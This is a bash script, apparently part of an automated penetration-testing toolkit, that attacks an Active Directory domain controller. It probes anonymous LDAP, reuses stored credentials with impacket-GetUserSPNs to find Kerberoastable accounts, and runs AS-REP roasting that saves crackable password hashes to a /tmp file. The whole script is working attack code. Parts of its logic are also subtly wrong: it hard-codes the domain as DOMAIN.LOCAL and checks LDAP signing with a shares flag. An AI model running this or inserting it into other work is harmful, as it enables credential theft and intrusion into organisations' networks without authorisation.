#!/bin/bash
# Active Directory enumeration: anonymous LDAP + Kerberoasting discovery
# Usage: ad_enum.sh <TARGET_IP>
# required_tools: netexec, impacket-GetUserSPNs
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"

echo "{\"type\":\"status\",\"data\":{\"action\":\"ad_enum\",\"target\":\"$TARGET_IP\"}}"

LDAP_OUTPUT=$(netexec ldap "$TARGET_IP" -u '' -p '' 2>&1 || true)

if echo "$LDAP_OUTPUT" | grep -qi "success"; then
  DOMAIN=$(echo "$LDAP_OUTPUT" | grep -oP 'domain:\s*\K\S+' | head -1)
  DC_NAME=$(echo "$LDAP_OUTPUT" | grep -oP 'name:\s*\K\S+' | head -1)

  echo "{\"type\":\"ldap_anon\",\"data\":{\"target\":\"$TARGET_IP\",\"authenticated\":true,\"domain\":\"$DOMAIN\",\"dc_name\":\"$DC_NAME\"}}"
else
  echo "{\"type\":\"ldap_anon\",\"data\":{\"target\":\"$TARGET_IP\",\"authenticated\":false,\"raw\":\"$(echo "$LDAP_OUTPUT" | tr '\n' ' ' | sed 's/"/\\"/g')\"}}"
fi

echo "{\"type\":\"status\",\"data\":{\"message\":\"Checking LDAP signing status\"}}"
LDAP_SIGNING=$(netexec ldap "$TARGET_IP" -u '' -p '' --shares 2>&1 || true)
if echo "$LDAP_SIGNING" | grep -qi "signing"; then
  echo "{\"type\":\"ldap_signing\",\"data\":{\"target\":\"$TARGET_IP\",\"raw\":\"$(echo "$LDAP_SIGNING" | tr '\n' ' ' | sed 's/"/\\"/g')\"}}"
fi

echo "{\"type\":\"status\",\"data\":{\"message\":\"Enumerating Kerberoastable users\"}}"
if [ -f /tmp/known_creds_b64 ]; then
  CRED=$(head -1 /tmp/known_creds_b64 | base64 -d 2>/dev/null || head -1 /tmp/known_creds_b64)
else
  CRED=""
fi

if [ -n "$CRED" ]; then
  SPN_USERS=$(impacket-GetUserSPNs "DOMAIN.LOCAL/$CRED" -dc-ip "$TARGET_IP" 2>&1 || true)

  if echo "$SPN_USERS" | grep -qi "servicePrincipalName"; then
    while IFS= read -r line; do
      if echo "$line" | grep -qi "servicePrincipalName"; then
        SPN_USER=$(echo "$line" | awk '{print $1}')
        SPN_NAME=$(echo "$line" | grep -oP 'servicePrincipalName\s+\K[^ ]+' | head -1)
        echo "{\"type\":\"kerberoastable\",\"data\":{\"user\":\"$SPN_USER\",\"spn\":\"$SPN_NAME\",\"target\":\"$TARGET_IP\"}}"
      fi
    done <<< "$SPN_USERS"

    SPN_COUNT=$(echo "$SPN_USERS" | grep -ci "servicePrincipalName" || echo 0)
    echo "{\"type\":\"summary\",\"data\":{\"kerberoastable_users\":$SPN_COUNT}}"
  else
    echo "{\"type\":\"kerberoastable\",\"data\":{\"users_found\":0,\"message\":\"No Kerberoastable users or insufficient privileges\"}}"
  fi
else
  echo "{\"type\":\"kerberoastable\",\"data\":{\"users_found\":0,\"message\":\"No credentials available for Kerberoasting\"}}"
fi

echo "{\"type\":\"status\",\"data\":{\"message\":\"Checking for AS-REP roastable users via anonymous LDAP\"}}"
ASREP_OUTPUT=$(netexec ldap "$TARGET_IP" -u '' -p '' --asreproast /tmp/asrep_hashes.txt 2>&1 || true)
if [ -f /tmp/asrep_hashes.txt ] && [ -s /tmp/asrep_hashes.txt ]; then
  ASREP_HASHES=$(cat /tmp/asrep_hashes.txt | grep -c '\$krb5asrep\$' 2>/dev/null || echo 0)
  echo "{\"type\":\"asrep_roastable\",\"data\":{\"hashes_found\":$ASREP_HASHES,\"hash_file\":\"/tmp/asrep_hashes.txt\"}}"
else
  echo "{\"type\":\"asrep_roastable\",\"data\":{\"hashes_found\":0,\"message\":\"No AS-REP roastable users found or anonymous LDAP disabled\"}}"
fi

echo "{\"type\":\"result\",\"data\":{\"action\":\"ad_enum\",\"status\":\"complete\"}}"
